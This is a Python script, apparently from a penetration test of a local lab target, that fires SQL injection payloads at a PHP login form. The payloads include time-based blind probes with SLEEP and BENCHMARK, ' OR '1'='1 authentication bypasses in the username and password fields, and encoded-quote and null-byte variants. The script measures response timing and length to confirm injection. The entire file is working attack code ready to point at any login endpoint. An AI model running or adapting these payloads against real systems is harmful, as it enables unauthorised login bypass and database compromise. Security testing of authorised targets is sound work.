import requests
import time

# Target configuration
target_url = "http://127.0.0.1:32989/index.php"

def send_request(description, username, password):
    """Send POST request and measure timing"""
    data = {
        'username': username,
        'password': password
    }
    
    start_time = time.time()
    try:
        response = requests.post(target_url, data=data, timeout=30)
        elapsed = time.time() - start_time
        return {
            'description': description,
            'status': response.status_code,
            'content_length': len(response.content),
            'response_time': round(elapsed, 3)
        }
    except Exception as e:
        return {
            'description': description,
            'error': str(e),
            'response_time': round(time.time() - start_time, 3)
        }

print("TIME-BASED BLIND SQL INJECTION TEST")
print("=" * 80)
print("Testing for time delays to detect TRUE/FALSE conditions\n")

results = []

# 1. Baseline timing tests
print("[1] BASELINE TIMING TESTS")
print("-" * 40)

baseline_tests = [
    ("Normal login", "admin", "admin"),
    ("Invalid login", "random", "random"),
]

for desc, user, pwd in baseline_tests:
    result = send_request(desc, user, pwd)
    results.append(result)
    print(f"{desc}: {result['response_time']}s")

# 2. Time-based tests with SLEEP
print("\n\n[2] TIME-BASED TESTS - MySQL SLEEP()")
print("-" * 40)

time_tests_mysql = [
    ("Baseline (no SLEEP)", "admin", "admin"),
    ("SLEEP(2) - inline", "admin' AND SLEEP(2) --", "x"),
    ("SLEEP(3) - inline", "admin' AND SLEEP(3) --", "x"),
    ("TRUE: 1=1 AND SLEEP(2)", "' AND 1=1 AND SLEEP(2) --", "x"),
    ("FALSE: 1=2 AND SLEEP(2)", "' AND 1=2 AND SLEEP(2) --", "x"),
    ("OR SLEEP(2)", "' OR SLEEP(2) --", "x"),
]

for desc, user, pwd in time_tests_mysql:
    result = send_request(desc, user, pwd)
    results.append(result)
    time_indicators = ""
    if result['response_time'] >= 1.5:
        time_indicators = " [*] DELAY DETECTED!"
    print(f"{desc}: {result['response_time']}s{time_indicators}")

# 3. Time-based tests with BENCHMARK
print("\n\n[3] TIME-BASED TESTS - BENCHMARK()")
print("-" * 40)

benchmark_tests = [
    ("BENCHMARK(1000000,MD5(1))", "admin' AND BENCHMARK(1000000,MD5(1)) --", "x"),
    ("BENCHMARK(5000000,MD5(1))", "admin' AND BENCHMARK(5000000,MD5(1)) --", "x"),
]

for desc, user, pwd in benchmark_tests:
    result = send_request(desc, user, pwd)
    results.append(result)
    time_indicators = ""
    if result['response_time'] >= 1.0:
        time_indicators = " [*] DELAY DETECTED!"
    print(f"{desc}: {result['response_time']}s{time_indicators}")

# 4. Alternative injection - password field
print("\n\n[4] PASSWORD FIELD INJECTION TESTS")
print("-" * 40)

password_tests = [
    ("Password: ' OR '1'='1", "admin", "' OR '1'='1"),
    ("Password: ' AND 1=1 --", "admin", "' AND 1=1 --"),
    ("Password: ' AND 1=2 --", "admin", "' AND 1=2 --"),
    ("Both fields injection", "' OR '1'='1", "' OR '1'='1"),
]

for desc, user, pwd in password_tests:
    result = send_request(desc, user, pwd)
    results.append(result)
    print(f"{desc}: Status={result['status']}, Length={result['content_length']}, Time={result['response_time']}s")

# 5. Try different quote bypasses
print("\n\n[5] ALTERNATIVE QUOTE TECHNIQUES")
print("-" * 40)

quote_tests = [
    ("Backslash escape", "admin\\'", "x"),
    ("Encoded quote %27", "admin%27", "x"),
    ("Hex encoding", "admin\x27", "x"),
    ("Unicode quote", "admin\u0027", "x"),
    ("Double encode %2527", "admin%2527", "x"),
]

for desc, user, pwd in quote_tests:
    result = send_request(desc, user, pwd)
    results.append(result)
    print(f"{desc}: Status={result['status']}, Length={result['content_length']}, Time={result['response_time']}s")

# 6. PHP/Apache specific tests
print("\n\n[6] PHP-SPECIFIC INJECTION TESTS")
print("-" * 40)

php_tests = [
    ("Array injection []", "admin[]", "x"),
    ("Null byte", "admin\x00", "x"),
    ("PHP comment //", "admin//", "x"),
    ("PHP comment #", "admin#", "x"),
    ("Semicolon", "admin;", "x"),
]

for desc, user, pwd in php_tests:
    result = send_request(desc, user, pwd)
    results.append(result)
    print(f"{desc}: Status={result['status']}, Length={result['content_length']}, Time={result['response_time']}s")

# 7. Summary of findings
print("\n\n[7] SUMMARY")
print("=" * 80)

time_based_detected = any(r.get('response_time', 0) >= 1.5 for r in results)
if time_based_detected:
    print("[*] TIME-BASED SQL INJECTION DETECTED!")
    for r in results:
        if r.get('response_time', 0) >= 1.5:
            print(f"    - {r['description']}: {r['response_time']}s")
else:
    print("[!] No time-based delays detected")

# Check for any response differences
lengths = set(r.get('content_length', 0) for r in results if 'content_length' in r)
if len(lengths) > 1:
    print(f"\n[*] Multiple content lengths found: {lengths}")
else:
    print(f"\n[!] All responses have same content length: {lengths.pop() if lengths else 'N/A'}")

print(f"\nTotal requests: {len(results)}")

